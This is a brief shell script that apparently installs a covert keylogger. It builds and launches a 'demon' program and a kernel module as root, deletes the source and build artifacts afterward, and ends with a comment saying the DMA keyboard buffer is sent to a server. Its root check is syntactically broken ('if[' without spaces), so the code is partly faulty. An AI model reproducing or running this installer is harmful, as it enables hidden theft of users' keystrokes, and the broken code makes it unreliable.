#!/bin/sh

if[$(id -u) -ne 0]; then
    echo "must be root"
    exit 1
fi

cd $(pwd)/demon
make

rm -rf demon.c demon.cl demon.h

cd ../module_scan
make

insmod module.ko
rmmod module.ko

rm -rf *.o *.ko *.mod.* *.symvers *.order

cd ../demon
./demon

# DMA keyboard buffer sent to server
